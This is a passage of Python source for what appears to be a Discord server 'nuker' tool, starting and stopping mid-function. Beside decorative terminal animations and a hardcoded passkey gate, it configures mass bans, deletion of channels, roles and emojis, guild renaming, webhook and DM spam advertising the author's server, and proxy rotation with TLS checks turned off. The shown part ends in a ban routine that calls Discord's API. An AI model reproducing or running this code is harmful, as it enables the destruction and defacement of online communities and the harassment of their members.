                        cg = int(DEADLIZER_START[1]*(1-t) + DEADLIZER_END[1]*t)
                        cb = int(DEADLIZER_START[2]*(1-t) + DEADLIZER_END[2]*t)
                        cgrid[py][px] = (cr, cg, cb)
                    hx, hy = px, py
            
            # Scatter fragments
            if 0 <= hx < cols and 0 <= hy < rows:
                for _ in range(3):
                    sx = hx + random.randint(-4, 4)
                    sy = hy + random.randint(-2, 2)
                    if 0 <= sx < cols and 0 <= sy < rows:
                        grid[sy][sx] = random.choice("*.-~")
                        cgrid[sy][sx] = (200, 30, 30)

        for r_idx in range(rows):
            out = ""
            for c_idx in range(cols):
                ch = grid[r_idx][c_idx]
                cr, cg, cb = cgrid[r_idx][c_idx]
                out += f"\033[38;2;{cr};{cg};{cb}m{ch}" if ch != " " else " "
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.02)
    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")

def _deadlizer_switch_demon_tendrils():
    """DEMON TENDRILS: Dark thorny vines erupting from the center outward."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30

    cx, cy = cols // 2, rows // 2
    tendrils = []
    
    for _ in range(12):
        tendrils.append({'x': cx, 'y': cy, 'angle': random.uniform(0, math.pi*2), 'speed': random.uniform(1.0, 2.5), 'history': []})

    frames = 45
    for frame in range(frames):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        grid = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0,0,0)] * cols for _ in range(rows)]
        
        t = frame / frames

        if frame % 5 == 0 and frame < 30:
            tendrils.append({'x': cx, 'y': cy, 'angle': random.uniform(0, math.pi*2), 'speed': random.uniform(0.5, 3.5), 'history': []})

        for ten in tendrils:
            ten['angle'] += random.uniform(-0.3, 0.3)
            ten['x'] += math.cos(ten['angle']) * ten['speed'] * 2.0
            ten['y'] += math.sin(ten['angle']) * ten['speed']
            ten['history'].append((int(ten['x']), int(ten['y'])))

            for i, (px, py) in enumerate(ten['history']):
                if 0 <= px < cols and 0 <= py < rows:
                    grid[py][px] = random.choice("╬╠╣╦╩")
                    r = int(DEADLIZER_START[0]*(1-t) + DEADLIZER_END[0]*t)
                    g = int(DEADLIZER_START[1]*(1-t) + DEADLIZER_END[1]*t)
                    b = int(DEADLIZER_START[2]*(1-t) + DEADLIZER_END[2]*t)
                    cgrid[py][px] = (r, max(0, g-50*(1-i/len(ten['history']))), max(0, b-50))
                    
                    # Add thorns
                    if random.random() < 0.2:
                        sx = px + random.randint(-1, 1)
                        sy = py + random.randint(-1, 1)
                        if 0 <= sx < cols and 0 <= sy < rows:
                            grid[sy][sx] = random.choice("><+*")
                            cgrid[sy][sx] = (255, 0, 0)

        for r_idx in range(rows):
            out = ""
            for c_idx in range(cols):
                ch = grid[r_idx][c_idx]
                cr, cg, cb = cgrid[r_idx][c_idx]
                out += f"\033[38;2;{cr};{cg};{cb}m{ch}" if ch != " " else " "
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.02)
    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")


async def switch_to_deadlizer():
    global __mode__, __max_concurrent__, DEADLIZER_START, DEADLIZER_END
    __mode__ = "deadlizer"
    __max_concurrent__ = __config__.get("max_concurrent", 50) * 3 
    DEADLIZER_START, DEADLIZER_END = pick_random_gradient()
    
    effect = random.choice([
        _carnage_effect, 
        _deadlizer_switch_blood_rain, 
        _deadlizer_switch_hellfire, 
        _deadlizer_switch_abyssal, 
        _deadlizer_switch_demon_tendrils,
        _deadlizer_switch_terminal_melt,
        _deadlizer_switch_shatter_v2,
        _deadlizer_switch_phantom_shards,
        _deadlizer_switch_void_pulse,
        _deadlizer_switch_glitch_vortex,
        _deadlizer_switch_crimson_nebula,
        _deadlizer_switch_eternal_static,
        _deadlizer_switch_demon_scan
    ])

    sys.stdout.write("\033[?25l") # Hide cursor for transition
    sys.stdout.flush()
    
    try:
        if asyncio.iscoroutinefunction(effect):
            await effect()
        else:
            effect()
    finally:
        sys.stdout.write("\033[?25h") # Re-show cursor
        sys.stdout.flush()
        
    return True


def switch_config(config_name):
    global __config__, __current_config_name__, token, __max_concurrent__

    if config_name not in __loaded_configs__:
        print(
            format_log_message(
        "ERROR",
        f"Config '{config_name}' not found!",
        47))
        return False

    __current_config_name__ = config_name
    __config__ = __loaded_configs__[config_name].copy()
    token = __config__["token"]
    __max_concurrent__ = __config__.get("max_concurrent", 50)

    if os.name == "nt":
        os.system(
            f'title Codez ON TOP - Max Concurrent: {__max_concurrent__} - Config: {__current_config_name__}')

    return True


def load_multiple_configs():
    global __loaded_configs__, __current_config_name__, __config__, token, __max_concurrent__

    os.system("cls") if os.name == "nt" else os.system("clear")

    if not os.path.exists(config_folder):
        print(format_log_message("ERROR", "'configs' folder not found.", 50))
        os._exit(1)

    config_files = [f for f in os.listdir(
        config_folder) if f.endswith(".json")]
    if not config_files:
        print(
            format_log_message(
        "ERROR",
        "No JSON files found in 'configs' folder.",
        50))
        os._exit(1)
    while True:
        mode_start, mode_end = get_mode_colors()
        print(format_log_message("INFO", "Available Configs:", 50))
        print(
    gradient_text(
        "╭" +
        "─" *
        70 +
        "╮",
        mode_start,
        mode_end,
        bold=True))
        for i, config_file in enumerate(config_files, 1):
            print(
    gradient_text(
        f"│{i:<2} │ {config_file:<64} │",
        mode_start,
        mode_end,
        bold=True))
        print(
    gradient_text(
        "╰" +
        "─" *
        70 +
        "╯",
        mode_start,
        mode_end,
        bold=True))
        print(
            format_log_message(
        "INFO",
        "Enter numbers (e.g., 1,2), ranges (1-3), filenames, or 'all'",
        30))

        choice_input = input(
    format_log_message(
        "INPUT",
        "Choose config(s) to load",
        50)).strip()
        if not choice_input:
            print(
                format_log_message(
        "ERROR",
        "No input provided. Please enter config numbers or 'all'.",
        45))
            continue

        choice_lower = choice_input.lower()
        indices = []
        invalid_tokens = []

        if choice_lower == 'all':
            indices = list(range(len(config_files)))
        else:
            tokens = [t.strip() for t in choice_input.split(',') if t.strip()]
            for tok in tokens:
                if '-' in tok and all(p.strip().isdigit()
                                    for p in tok.split('-', 1)):
                    try:
                        a_str, b_str = tok.split('-', 1)
                        a = int(a_str.strip()) - 1
                        b = int(b_str.strip()) - 1
                        if a <= b:
                            for idx in range(a, b + 1):
                                if 0 <= idx < len(config_files):
                                    indices.append(idx)
                                else:
                                    invalid_tokens.append(str(idx + 1))
                        else:
                            invalid_tokens.append(tok)
                    except Exception:
                        invalid_tokens.append(tok)
                elif tok.isdigit():
                    idx = int(tok) - 1
                    if 0 <= idx < len(config_files):
                        indices.append(idx)
                    else:
                        invalid_tokens.append(tok)
                else:
                    if tok in config_files:
                        indices.append(config_files.index(tok))
                    else:
                        invalid_tokens.append(tok)

        if invalid_tokens:
            print(
                format_log_message(
        "ERROR",
        f"Invalid selections: {', '.join(invalid_tokens)}. Please try again.",
        60))
            continue

        seen = set()
        final_indices = []
        for i in indices:
            if i not in seen and 0 <= i < len(config_files):
                final_indices.append(i)
                seen.add(i)

        if not final_indices:
            print(
                format_log_message(
        "ERROR",
        "No valid configs selected. Please try again.",
        50))
            continue

        for idx in final_indices:
            config_path = os.path.join(config_folder, config_files[idx])
            try:
                loaded_config = json.load(
                    open(config_path, "r", encoding="utf-8"))
                __loaded_configs__[config_files[idx]] = loaded_config
                print(
                    format_log_message(
        "SUCCESS",
        f"Loaded {(config_files[idx])}",
        52))
            except json.JSONDecodeError as e:
                print(
                    format_log_message(
        "ERROR",
        f"Invalid JSON in {config_files[idx]}: {str(e)}",
        30))
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Error loading {config_files[idx]}: {str(e)}",
        35))

        if not __loaded_configs__:
            print(
                format_log_message(
        "ERROR",
        "No valid configs loaded! Please correct files and try again.",
        43))
            continue

        __current_config_name__ = list(__loaded_configs__.keys())[0]
        __config__ = __loaded_configs__[__current_config_name__].copy()
        token = __config__["token"]
        __max_concurrent__ = __config__.get("max_concurrent", 50)
        print(
            format_log_message(
        "SUCCESS",
        f"Active config: {(__current_config_name__)}",
        45))
        time.sleep(1.5)
        break


def _passkey_gate():
    """Passkey screen with animation | must enter correct key before anything starts."""
    import sys, math
    os.system("cls") if os.name == "nt" else os.system("clear")
    try:
        cols = os.get_terminal_size().columns
    except Exception:
        cols = 120

    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()

    rain_chars = "???????????????????????????????????0123456789"
    glitch_chars = "||||+||++++--|-+|||_"

    lock_art = [
        "██╗      ██████╗  ██████╗██╗  ██╗███████╗██████╗ ",
        "██║     ██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗",
        "██║     ██║   ██║██║     █████╔╝ █████╗  ██║  ██║",
        "██║     ██║   ██║██║     ██╔═██╗ ██╔══╝  ██║  ██║",
        "███████╗╚██████╔╝╚██████╗██║  ██╗███████╗██████╔╝",
        "╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ",
        "                                                 ",
    ]

    msg = "  ACCESS RESTRICTED | ENTER PASSKEY TO CONTINUE  "
    box_inner = len(msg)
    box_top    = "╔" + "═" * box_inner + "╗"
    box_mid    = "║" +       msg        + "║"
    box_bot    = "╚" + "═" * box_inner + "╝"
    box_lines  = [box_top, box_mid, box_bot]

    total_lines = len(lock_art) + 1 + len(box_lines)
    max_width   = max(max(len(l) for l in lock_art), len(box_top))

    def hsv_to_rgb(h, s, v):
        h = h % 360
        c = v * s
        x = c * (1 - abs((h / 60) % 2 - 1))
        m = v - c
        if h < 60:   r, g, b = c, x, 0
        elif h < 120: r, g, b = x, c, 0
        elif h < 180: r, g, b = 0, c, x
        elif h < 240: r, g, b = 0, x, c
        elif h < 300: r, g, b = x, 0, c
        else:         r, g, b = c, 0, x
        return int((r+m)*255), int((g+m)*255), int((b+m)*255)

    # -- PHASE 0: Matrix rain --
    rain_rows = min(20, total_lines + 4)
    num_cols  = min(cols, max_width + 20)
    col_off   = max((cols - num_cols) // 2, 0)
    drops = [{'y': random.randint(-rain_rows, 0), 'speed': random.uniform(0.5,1.4), 'trail': random.randint(3,10)} for _ in range(num_cols)]

    for frame in range(18):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        fade = max(0.0, 1.0 - frame/17) if frame > 10 else 1.0
        for row in range(rain_rows):
            line_out = " " * col_off
            for c in range(num_cols):
                d = drops[c]
                dist = row - d['y']
                if 0 <= dist <= d['trail']:
                    intensity = (1.0 - dist/d['trail']) * fade
                    t = dist / d['trail']
                    r = int((WIZZLER_START[0]*(1-t) + WIZZLER_END[0]*t) * intensity)
                    g = int((WIZZLER_START[1]*(1-t) + WIZZLER_END[1]*t) * intensity)
                    b = int((WIZZLER_START[2]*(1-t) + WIZZLER_END[2]*t) * intensity)
                    line_out += f"\033[38;2;{r};{g};{b}m{random.choice(rain_chars)}"
                else:
                    line_out += " "
            sys.stdout.write(line_out + "\033[0m\n")
        for d in drops:
            d['y'] += d['speed']
            if d['y'] - d['trail'] > rain_rows:
                d['y'] = random.randint(-6,-1)
                d['speed'] = random.uniform(0.5,1.4)
                d['trail'] = random.randint(3,10)
        sys.stdout.flush()
        time.sleep(0.04)

    os.system("cls") if os.name == "nt" else os.system("clear")

    # -- PHASE 1: Glitch reveal of lock_art --
    all_lines = lock_art + [""] + box_lines
    phase1 = 28
    lock_frame = []
    for ri, line in enumerate(all_lines):
        row_locks = []
        for ci in range(len(line)):
            cx, cy = max_width/2, len(all_lines)/2
            dist = math.sqrt((ci-cx)**2 + ((ri-cy)*3)**2)
            md   = math.sqrt(cx**2 + (cy*3)**2)
            prog = dist / max(md, 1)
            lf   = int(4 + prog*(phase1-10)) + random.randint(-3,3)
            row_locks.append(max(3, min(phase1-3, lf)))
        lock_frame.append(row_locks)

    for frame in range(phase1):
        if skipper.should_skip: break
        if frame > 0:
            sys.stdout.write(f"\033[{len(all_lines)}A")
        t = frame / max(phase1-1, 1)
        ring_r = t * max(max_width, len(all_lines)*3) * 0.9

        for ri, line in enumerate(all_lines):
            pad = max((cols - len(line)) // 2, 0)
            output = ""
            is_box = ri >= len(lock_art) + 1
            for ci, real_ch in enumerate(line):
                locked = frame >= lock_frame[ri][ci]
                if real_ch == ' ':
                    ch = random.choice(glitch_chars) if frame < phase1//4 and random.random() < 0.04 else ' '
                elif not locked:
                    reveal = (frame / lock_frame[ri][ci]) ** 2
                    ch = real_ch if random.random() < reveal*0.5 else random.choice(glitch_chars)
                else:
                    ch = real_ch

                if is_box:
                    hue_base = 320  # pink for box
                else:
                    hue_base = 240  # purple for lock art
                hue = hue_base + ((ci*2 + ri*6 + frame*10) % 120)
                val = min(1.0, t*1.8)
                r, g, b = hsv_to_rgb(hue, 0.85, val)
                cx2, cy2 = max_width/2, len(all_lines)/2
                dist_ring = abs(math.sqrt((ci-cx2)**2+((ri-cy2)*3)**2) - ring_r)
                glow = max(0.0, 1.0 - dist_ring/15.0)
                if glow > 0:
                    r = min(255, int(r + (255-r)*glow*0.8))
                    g = min(255, int(g + (255-g)*glow*0.9))
                    b = min(255, int(b + (255-b)*glow*0.85))
                output += f"\033[38;2;{r};{g};{b}m{ch}"
            sys.stdout.write(" "*pad + "\033[1m" + output + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.045)

    # -- PHASE 2: Rainbow shimmer ? settle --
    for frame in range(20):
        if skipper.should_skip: break
        sys.stdout.write(f"\033[{len(all_lines)}A")
        t = frame / 19
        settle = t * t
        for ri, line in enumerate(all_lines):
            pad = max((cols - len(line)) // 2, 0)
            output = ""
            is_box = ri >= len(lock_art) + 1
            cs = PINK_START if is_box else WIZZLER_START
            ce = PINK_END   if is_box else WIZZLER_END
            for ci, ch in enumerate(line):
                hue = (ci*3.5 + ri*14 - frame*16) % 360
                rr, rg, rb = hsv_to_rgb(hue, 0.9, 1.0)
                hb = ci / max(len(line)-1, 1)
                rf = int(cs[0]*(1-hb) + ce[0]*hb)
                gf = int(cs[1]*(1-hb) + ce[1]*hb)
                bf = int(cs[2]*(1-hb) + ce[2]*hb)
                r = int(rr*(1-settle) + rf*settle)
                g = int(rg*(1-settle) + gf*settle)
                b = int(rb*(1-settle) + bf*settle)
                output += f"\033[38;2;{r};{g};{b}m{ch}"
            sys.stdout.write(" "*pad + "\033[1m" + output + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.04)

    # -- PHASE 3: Neon pulse --
    for pulse in range(5):
        if skipper.should_skip: break
        sys.stdout.write(f"\033[{len(all_lines)}A")
        pv = (math.sin(pulse*math.pi*0.8)+1)/2
        br = 0.5 + pv*0.5
        for ri, line in enumerate(all_lines):
            pad = max((cols - len(line)) // 2, 0)
            is_box = ri >= len(lock_art) + 1
            cs = PINK_START if is_box else WIZZLER_START
            r = min(255, int(cs[0]*br + 100*pv))
            g = min(255, int(cs[1]*br + 50*pv))
            b = min(255, int(cs[2]*br + 80*pv))
            sys.stdout.write(" "*pad + f"\033[1m\033[38;2;{r};{g};{b}m" + line + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.07)

    # -- PHASE 4: Breathing settle --
    for frame in range(12):
        if skipper.should_skip: break
        sys.stdout.write(f"\033[{len(all_lines)}A")
        t = frame / 11
        breathe = math.sin(t*math.pi*3)*(1-t)*0.25
        for ri, line in enumerate(all_lines):
            pad = max((cols - len(line)) // 2, 0)
            output = ""
            is_box = ri >= len(lock_art) + 1
            cs = PINK_START if is_box else WIZZLER_START
            ce = PINK_END   if is_box else WIZZLER_END
            for ci, ch in enumerate(line):
                hb = ci / max(len(line)-1, 1)
                r = int(cs[0]*(1-hb) + ce[0]*hb)
                g = int(cs[1]*(1-hb) + ce[1]*hb)
                b = int(cs[2]*(1-hb) + ce[2]*hb)
                glow = 1.0 + breathe
                output += f"\033[38;2;{min(255,int(r*glow))};{min(255,int(g*glow))};{min(255,int(b*glow))}m{ch}"
            sys.stdout.write(" "*pad + "\033[1m" + output + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.05)

    skipper.stop()
    print()

    # -- INPUT --
    CORRECT_KEY = "codez4ever"
    MAX_ATTEMPTS = 3

    for attempt in range(1, MAX_ATTEMPTS + 1):
        try:
            import sys as _sys
            prompt = format_log_message("INPUT", f"Enter Passkey [{attempt}/{MAX_ATTEMPTS}]", 50)
            if os.name == 'nt':
                # Windows: use msvcrt for character-by-character masked input
                import msvcrt as _m
                _sys.stdout.write(prompt)
                _sys.stdout.flush()
                key = ""
                while True:
                    ch = _m.getwch()
                    if ch in ('\r', '\n'):
                        _sys.stdout.write('\n')
                        _sys.stdout.flush()
                        break
                    elif ch == '\x03':
                        raise KeyboardInterrupt
                    elif ch in ('\x08', '\x7f'):
                        if key:
                            key = key[:-1]
                            _sys.stdout.write('\b \b')
                            _sys.stdout.flush()
                    else:
                        key += ch
                        _sys.stdout.write('*')
                        _sys.stdout.flush()
            else:
                # Linux / macOS / Termux: use getpass (handles terminal masking)
                import getpass as _gp
                _sys.stdout.write(prompt)
                _sys.stdout.flush()
                try:
                    key = _gp.getpass(prompt='', stream=_sys.stdout)
                except Exception:
                    # Fallback: tty raw-mode character reader
                    import tty, termios
                    fd = _sys.stdin.fileno()
                    old_settings = termios.tcgetattr(fd)
                    key = ""
                    try:
                        tty.setraw(fd)
                        while True:
                            ch = _sys.stdin.read(1)
                            if ch in ('\r', '\n'):
                                _sys.stdout.write('\n')
                                _sys.stdout.flush()
                                break
                            elif ch == '\x03':
                                raise KeyboardInterrupt
                            elif ch in ('\x08', '\x7f'):
                                if key:
                                    key = key[:-1]
                                    _sys.stdout.write('\b \b')
                                    _sys.stdout.flush()
                            else:
                                key += ch
                                _sys.stdout.write('*')
                                _sys.stdout.flush()
                    finally:
                        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)

            if key.strip() == CORRECT_KEY:
                print()
                print(format_log_message("SUCCESS", "Access granted. Welcome back.", 40))
                time.sleep(0.8)
                os.system("cls") if os.name == "nt" else os.system("clear")
                return

            remaining = MAX_ATTEMPTS - attempt
            if remaining > 0:
                print(format_log_message("ERROR", f"Wrong passkey. {remaining} attempt(s) left.", 40))
            else:
                print()
                print(format_log_message("ERROR", "Too many failed attempts. Exiting.", 40))
                time.sleep(1.0)
                os._exit(1)
        except (KeyboardInterrupt, EOFError):
            print("\n" + format_log_message("INFO", "Exiting... Goodbye!", 40))
            os._exit(0)

try:
    _passkey_gate()
    show_startup_banner()

    __mode__ = "deadlizer"
    print(format_log_message("INFO", "DEVELOPED BY STARK", 40))
    time.sleep(2.0)
    os.system("cls") if os.name == "nt" else os.system("clear")
except KeyboardInterrupt:
    print("\n" + format_log_message("INFO", "Exiting... Goodbye!", 40))
    os._exit(0)

try:
    print(
        format_log_message(
        "INFO",
        "Load config file or manual input? [c/m]",
        50),
        end=" ")
    config_choice = input().strip().lower()

    if config_choice == 'm':
        __manual_mode__ = True
        token = input(
    format_log_message(
        "INPUT",
        "Enter bot token",
        50)).strip()
        if not token:
            print(format_log_message("ERROR", "Token is required!", 47))
            os._exit(1)
        max_concurrent = input(
    format_log_message(
        "INPUT",
        "Enter max concurrent tasks (default 200)",
        50)).strip()
        max_concurrent = int(
            max_concurrent) if max_concurrent.isdigit() else 200
        use_proxy = input(
    format_log_message(
        "INPUT",
        "Use proxies? [y/n]",
        50)).strip().lower() == 'y'

        __config__ = {
            "token": token,
            "max_concurrent": max_concurrent,
            "proxy": use_proxy,
            "nuke": {
                "channel_names": [],
                "roles_name": [],
                "messages_content": [],
                "delete_all_channels": False
            },
            "nuke_all": {
                "ban_members": True,
                "delete_channels": True,
                "delete_roles": True,
                "delete_emojis": True,
                "change_guild_name": True,
                "create_channels": True,
                "create_roles": True,
                "spam_webhooks": True
            },
            "operations": {
                "ban_reason": "Nuked by WannaBeStark",
                "nick_users_to": "Wizzed by WannaBeStark",
                "dm_message": "@everyone WannaBeStark wizzed This Server! join discord.gg/WannaBeStark",
                "spam_message": "@everyone @here Wizzed by WannaBeStark join discord.gg/WannaBeStark",
                "guild_name": "Wizzed By WannaBeStark",
                "guild_icon": "",
                "channel_type": 0,
                "enable_auto_admin": True,
                "emoji_rename_to": "Wizzed by shakti",
            }
        }
        __loaded_configs__["manual"] = __config__.copy()
        __current_config_name__ = "manual"
        print(format_log_message("SUCCESS", "Manual configuration loaded", 33))

        os.system("cls") if os.name == "nt" else os.system("clear")
    else:
        load_multiple_configs()
        os.system("cls") if os.name == "nt" else os.system("clear")
except KeyboardInterrupt:
    os.system("cls") if os.name == "nt" else os.system("clear")
    print("\n" + format_log_message("INFO", "Exiting... Goodbye!", 40))
    os._exit(0)

token = __config__["token"]
__max_concurrent__ = __config__.get("max_concurrent", 50)
if __mode__ == "deadlizer":
    __max_concurrent__ *= 3

os.system("cls") if os.name == "nt" else os.system("clear")

console_width = 107


class RateLimiter:
    def __init__(self, max_concurrent):
        self.semaphore = asyncio.Semaphore(max_concurrent)

    async def __aenter__(self):
        await self.semaphore.acquire()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        self.semaphore.release()


class shakti:
    def __init__(self, guildid):
        self.guildid = guildid
        self.guild = None
        self.has_proxies     = False
        self.proxy_count     = 0
        self._proxy_list     = []
        self._proxy_sessions = {}
        self._proxy_idx      = 0
        try:
            with open("proxies.txt", "r") as f:
                proxy_list = f.read().splitlines()
            if not proxy_list:
                print(format_log_message("ERROR", "proxies.txt is empty. Disabling proxies.", 28))
            else:
                valid_proxies = []
                for proxy in proxy_list:
                    proxy = proxy.strip()
                    if not proxy:
                        continue
                    if "@" in proxy:
                        creds, addr = proxy.rsplit("@", 1)
                    else:
                        creds, addr = None, proxy
                    if ":" not in addr:
                        print(format_log_message("ERROR", f"Invalid proxy format: '{proxy}'. Skipping.", 16))
                        continue
                    host, port = addr.rsplit(":", 1)
                    if not port.isdigit():
                        print(format_log_message("ERROR", f"Invalid proxy port in '{proxy}'. Skipping.", 19))
                        continue
                    url = f"http://{creds}@{addr}" if creds else f"http://{addr}"
                    valid_proxies.append(url)
                if not valid_proxies:
                    print(format_log_message("ERROR", "No valid proxies found. Disabling proxies.", 23))
                else:
                    self._proxy_list = valid_proxies
                    self.has_proxies = True
                    self.proxy_count = len(valid_proxies)
                    print(format_log_message("SUCCESS", f"Loaded {len(valid_proxies)} valid proxies for rotation.", 17))
        except FileNotFoundError:
            print(format_log_message("ERROR", "proxies.txt not found. Disabling proxies.", 24))
        except Exception as e:
            print(format_log_message("ERROR", f"Error reading proxies: {str(e)}", 15))
            time.sleep(2)

        self.version = cycle(['v9','v10'])
        self.banned = []
        self.kicked = []
        self.channels = []
        self.roles = []
        self.emojis = []
        self.messages = []
        self.semaphore = RateLimiter(__max_concurrent__)
        self.session = None
        self._route_buckets = {}
        self._bucket_lock   = asyncio.Lock()
        self.token = __config__["token"]
        self.concurrent = __max_concurrent__
        self.whitelist_file = "configs/whitelist.txt"
        self.whitelist = self._load_whitelist()
        self.auto_admin_enabled = False
        self.menu_shown_once = False
        self._animating = False
        print(
            format_log_message(
        "SUCCESS",
        f"Loaded {(str(len(self.whitelist)))} whitelisted members.",
        22))
        time.sleep(1.5)

    def _load_whitelist(self):
        try:
            if not os.path.exists(self.whitelist_file):
                return set()
            with open(self.whitelist_file, "r") as f:
                return set(line.strip()
                        for line in f if line.strip() and line.strip().isdigit())
        except Exception:
            return set()

    def _save_whitelist(self):
        try:
            os.makedirs(
    os.path.dirname(
        self.whitelist_file) or 'configs',
        exist_ok=True)
            with open(self.whitelist_file, "w") as f:
                f.write('\n'.join(sorted(list(self.whitelist))))
        except Exception as e:
            print(
                format_log_message(
        "ERROR",
        f"Failed to save whitelist: {e}",
        36))

    async def add_to_whitelist(self, user_id):
        user_id = user_id.strip()
        if not user_id.isdigit():
            print(
                format_log_message(
        "ERROR",
        f"Invalid User ID: {user_id}",
        40))
            return False
        if user_id in self.whitelist:
            print(
                format_log_message(
        "INFO",
        f"User {user_id} already whitelisted",
        40))
            return False
        self.whitelist.add(user_id)
        self._save_whitelist()
        print(
            format_log_message(
        "SUCCESS",
        f"Whitelisted User ID: {user_id}",
        40))
        return True

    async def remove_from_whitelist(self, user_id):
        user_id = user_id.strip()
        if user_id in self.whitelist:
            self.whitelist.remove(user_id)
            self._save_whitelist()
            print(
                format_log_message(
        "SUCCESS",
        f"Removed User ID: {user_id} from whitelist",
        35))
            return True
        print(
            format_log_message(
        "ERROR",
        f"User {user_id} not found in whitelist",
        40))
        return False

    async def async_input(self, prompt: str):
        try:
            user_input = await asyncio.get_event_loop().run_in_executor(None, lambda: input(prompt))
            if user_input.lower().strip() in ['d', 'dd', 'ddd', 'dddd', 'ddddd', 'dddddd', 'd' * 7]:
                if __mode__ == "wizzler":
                    await switch_to_deadlizer()
                else:
                    await switch_to_wizzler()
                return "MODE_SWITCHED"
            await asyncio.sleep(0.1) # Reduced from blocking 0.7s to async 0.1s
            return user_input
        except KeyboardInterrupt:
            # Handle exit animation on Ctrl+C if UI context exists
            if hasattr(self, 'last_ui') and self.last_ui:
                await self._menu_exit_animation(*self.last_ui)
            os.system("cls") if os.name == "nt" else os.system("clear")
            print("\n" + format_log_message("INFO", "Exiting... Goodbye!", 40))
            os._exit(0)

    async def _get_session(self):
        _headers = {
            "Authorization": f"Bot {self.token}",
            "Content-Type":  "application/json",
            "User-Agent":    "DiscordBot (https://discord.com, 10)",
            "Connection":    "keep-alive",
        }
        if __mode__ == "deadlizer":
            _limits  = httpx.Limits(max_connections=150, max_keepalive_connections=75, keepalive_expiry=60.0)
            _timeout = httpx.Timeout(connect=5.0, read=8.0, write=5.0, pool=5.0)
        else:
            _limits  = httpx.Limits(max_connections=100, max_keepalive_connections=50, keepalive_expiry=120.0)
            _timeout = httpx.Timeout(connect=10.0, read=15.0, write=10.0, pool=10.0)
        if __config__.get("proxy") and self.has_proxies:
            proxy_url = self._proxy_list[self._proxy_idx % len(self._proxy_list)]
            self._proxy_idx += 1
            if proxy_url not in self._proxy_sessions or self._proxy_sessions[proxy_url].is_closed:
                self._proxy_sessions[proxy_url] = httpx.AsyncClient(
                    http2=True, proxies=proxy_url,
                    limits=_limits, timeout=_timeout,
                    headers=_headers, verify=False,
                )
            return self._proxy_sessions[proxy_url]

        if self.session is None or self.session.is_closed:
            self.session = httpx.AsyncClient(
                http2=True, limits=_limits, timeout=_timeout,
                headers=_headers, verify=False,
            )
        return self.session


    def _route_key(self, method: str, url: str) -> str:
        import re
        key = re.sub(r'/\d{15,21}', '/{id}', url)
        return f"{method.upper()}:{key}"

    async def _update_bucket(self, route_key: str, headers) -> None:
        remaining   = headers.get("X-RateLimit-Remaining")
        reset_after = headers.get("X-RateLimit-Reset-After")
        if remaining is None or reset_after is None:
            return
        async with self._bucket_lock:
            self._route_buckets[route_key] = {
                "remaining":  int(remaining),
                "reset_after": float(reset_after),
                "reset_at":   time.monotonic() + float(reset_after),
            }

    async def _wait_for_bucket(self, route_key: str) -> None:
        async with self._bucket_lock:
            bucket = self._route_buckets.get(route_key)
            if not bucket:
                return
            if bucket["remaining"] <= 0:
                wait = bucket["reset_at"] - time.monotonic()
                if wait > 0:
                    await asyncio.sleep(wait + 0.02)
                self._route_buckets.pop(route_key, None)

    async def _api_request(self, method, url, token, max_retries=3, extra_headers=None, ignore_429=False, **kwargs):
        session   = await self._get_session()
        route_key = self._route_key(method, url)
        headers   = {"Authorization": f"Bot {token}"}
        if extra_headers:
            headers.update(extra_headers)
        for attempt in range(max_retries):
            await self._wait_for_bucket(route_key)
            try:
                response = await getattr(session, method)(
                    url, headers=headers, **kwargs
                )
                await self._update_bucket(route_key, response.headers)
                if response.status_code == 429:
                    if ignore_429:
                        return response
                    try:
                        header_val = response.headers.get("X-RateLimit-Reset-After")
                        body_val   = response.json().get("retry_after", 1.0)
                        if header_val is not None:
                            retry_after = max(float(header_val), float(body_val))
                        else:
                            retry_after = float(body_val)
                    except Exception:
                        retry_after = 1.0 + attempt * 0.5
                    retry_after += random.uniform(0.05, 0.15)
                    async with self._bucket_lock:
                        self._route_buckets[route_key] = {
                            "remaining":  0,
                            "reset_after": retry_after,
                            "reset_at":   time.monotonic() + retry_after,
                        }
                    print(format_log_message(
                        "INFO",
                        f"Rate limited — waiting {retry_after:.2f}s (attempt {attempt+1}/{max_retries})",
                        45))
                    await asyncio.sleep(retry_after)
                    continue
                return response
            except (httpx.TimeoutException, httpx.ConnectError):
                if attempt < max_retries - 1:
                    continue
                return None
            except Exception:
                return None
        return None


    async def execute_ban(self, member: str, token: str):
        if member in self.whitelist:
            print(
                format_log_message(
        "INFO",
        f"Skipping whitelisted member {member} (Ban)",
        41))
            return True

        async with self.semaphore:
            ban_reason = __config__.get("operations", {}).get("ban_reason", "Nuked by WannaBeStark")
            payload = {
    "delete_message_days": random.randint(
        0, 7)}
            try:
                response = await self._api_request(
                    "put",
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/bans/{member}",
                    token, extra_headers={"X-Audit-Log-Reason": ban_reason}, ignore_429=True, json=payload
                )
                if response is None:
                    print(format_log_message("ERROR", f"Failed to ban {member} (no response)", 46))
                    return False
                if response.status_code in [200, 201, 204]:
                    print(
                        format_log_message(
        "SUCCESS",
        f"Banned {member}",
        52))
                    self.banned.append(member)
                    return True
                elif "Missing Permissions" in response.text:
                    print(
                        format_log_message(
        "ERROR",
        f"Missing Permissions for {member}",
        41))
                    return False
                elif "You are being blocked" in response.text:
                    print(
                        format_log_message(
        "ERROR",
        "Blocked from Discord API",
        40))
                    return False
                elif "Max number of bans" in response.text:
                    print(format_log_message("ERROR", "Max bans exceeded", 47))
                    return False
